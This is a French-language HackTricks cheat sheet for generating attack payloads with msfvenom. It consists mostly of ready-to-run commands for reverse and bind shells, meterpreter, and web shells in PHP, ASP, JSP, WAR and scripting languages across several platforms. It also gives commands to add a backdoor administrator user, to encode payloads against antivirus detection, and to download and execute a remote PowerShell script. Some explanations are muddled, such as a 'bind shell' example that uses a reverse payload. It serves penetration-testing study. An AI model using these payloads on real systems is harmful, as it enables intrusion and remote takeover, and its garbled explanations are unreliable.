# MSFVenom - Fiche de triche

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels de bugs web3

🔔 Recevez des notifications sur les nouveaux programmes de primes de bugs

💬 Participez aux discussions de la communauté

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

On peut également utiliser `-a` pour spécifier l'architecture ou `--platform`.
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Paramètres courants lors de la création d'un shellcode

Les paramètres couramment utilisés lors de la création d'un shellcode sont les suivants : 

- **Payload**: Le type de charge utile que vous souhaitez utiliser, tel que `windows/meterpreter/reverse_tcp` ou `linux/x86/shell_reverse_tcp`.
- **Encoder**: L'encodeur que vous souhaitez utiliser pour éviter la détection, tel que `shikata_ga_nai` ou `x86/shikata_ga_nai`.
- **Badchars**: Les caractères qui ne doivent pas être inclus dans le shellcode, tels que `\x00` ou `\x0a`.
- **Platform**: La plate-forme cible pour laquelle vous créez le shellcode, telle que `Windows` ou `Linux`.
- **Arch**: L'architecture cible pour laquelle vous créez le shellcode, telle que `x86` ou `x64`.
- **Format**: Le format de sortie que vous souhaitez utiliser, tel que `raw`, `c`, `exe`, `elf` ou `dll`.
- **Outfile**: Le nom de fichier de sortie pour le shellcode.
```bash
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 5 
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Shell inversé**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Shell de liaison (Bind Shell)
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Créer un utilisateur
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Exécuter une commande**

Utilisez la charge utile `exec` de `msfvenom` pour exécuter une commande sur la machine cible. Vous pouvez spécifier la commande à exécuter en utilisant l'option `-c` suivie de la commande. Par exemple, pour exécuter la commande `whoami` sur la machine cible, utilisez la commande suivante:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f <FORMAT> -o <OUTPUT_FILE> -c 'whoami'
```

Remplacez `<LOCAL_IP>` et `<LOCAL_PORT>` par votre adresse IP et le port local respectivement. `<FORMAT>` et `<OUTPUT_FILE>` peuvent être remplacés par le format de sortie et le nom de fichier souhaités.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encodeur
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Intégré dans un exécutable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Charges utiles Linux

### Shell inversé
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Shell de liaison (Bind Shell)
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

### Description

SunOS est un système d'exploitation Unix propriétaire développé par Sun Microsystems, qui a été acquis par Oracle en 2010. Solaris est la version commerciale de SunOS.

### Payloads

#### Command Execution

```
msfvenom -p cmd/unix/reverse_perl LHOST=<IP Address> LPORT=<Port> -f <Format> > shell.<ext>
```

#### Meterpreter Reverse TCP

```
msfvenom -p solaris/sparc/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port> -f <Format> > shell.<ext>
```

#### Meterpreter Bind TCP

```
msfvenom -p solaris/sparc/meterpreter/bind_tcp LPORT=<Port> -f <Format> > shell.<ext>
```

#### Shell Reverse TCP

```
msfvenom -p solaris/sparc/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f <Format> > shell.<ext>
```

#### Shell Bind TCP

```
msfvenom -p solaris/sparc/shell_bind_tcp LPORT=<Port> -f <Format> > shell.<ext>
```

### References

- [https://en.wikipedia.org/wiki/SunOS](https://en.wikipedia.org/wiki/SunOS)
- [https://en.wikipedia.org/wiki/Oracle_Solaris](https://en.wikipedia.org/wiki/Oracle_Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Payloads MAC**

### **Shell inversé :**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Shell de liaison**

Avec une shell de liaison, la victime se connecte à notre machine et obtient un shell. Pour créer un shell de liaison, utilisez la commande `msfvenom` suivante :

```
msfvenom -p {payload} LHOST={IP} LPORT={port} -f {format} -o {output_file}
```

- `{payload}` : le payload que vous souhaitez utiliser.
- `{IP}` : l'adresse IP de votre machine.
- `{port}` : le port sur lequel vous souhaitez écouter.
- `{format}` : le format de sortie souhaité.
- `{output_file}` : le nom du fichier de sortie.

Par exemple, pour créer un shell de liaison avec le payload `windows/meterpreter/reverse_tcp`, l'adresse IP `192.168.1.100` et le port `4444`, utilisez la commande suivante :

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o bind_shell.exe
```
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payloads basés sur le Web**

### **PHP**

#### Shell inversé
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Shell inversé
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Shell inversé
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### GUERRE

#### Shell Inversé
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS est une plateforme logicielle open-source basée sur le moteur JavaScript V8 de Google. Elle permet d'exécuter du code JavaScript côté serveur, ce qui permet de créer des applications web hautement évolutives et performantes. NodeJS est souvent utilisé pour les applications en temps réel, les API et les microservices.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads de langage de script**

### **Perl**

Perl est un langage de script populaire pour les pirates informatiques en raison de sa flexibilité et de sa capacité à être exécuté sur plusieurs plates-formes. MSFVenom peut générer des charges utiles Perl pour une variété de tâches, notamment l'exécution de commandes, l'ouverture d'un shell et la création d'un utilisateur.

Voici un exemple de charge utile Perl pour ouvrir un shell sur une machine cible:

```
msfvenom -p cmd/unix/reverse_perl LHOST=<attacker IP> LPORT=<attacker port> -f raw
```

Cette charge utile se connectera à l'adresse IP de l'attaquant sur le port spécifié et ouvrira un shell sur la machine cible.
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python est un langage de programmation interprété de haut niveau, orienté objet et multiplateforme. Il est souvent utilisé pour l'automatisation de tâches, le développement web, l'analyse de données et la création de scripts. Python est également largement utilisé dans le domaine de la sécurité informatique pour la création d'outils de hacking et de scripts d'exploitation. Il est facile à apprendre et à utiliser, et dispose d'une grande communauté de développeurs qui contribuent à son développement continu.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash est un shell Unix populaire utilisé pour l'automatisation de tâches et l'écriture de scripts. Il est également utilisé pour l'exploitation de vulnérabilités dans les systèmes Unix. Les scripts Bash peuvent être utilisés pour automatiser des tâches telles que la collecte d'informations, l'escalade de privilèges et l'exécution de commandes à distance. Les scripts Bash peuvent également être utilisés pour créer des backdoors et des chevaux de Troie.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez des tutoriels sur les bugs web3

🔔 Recevez des notifications sur les nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
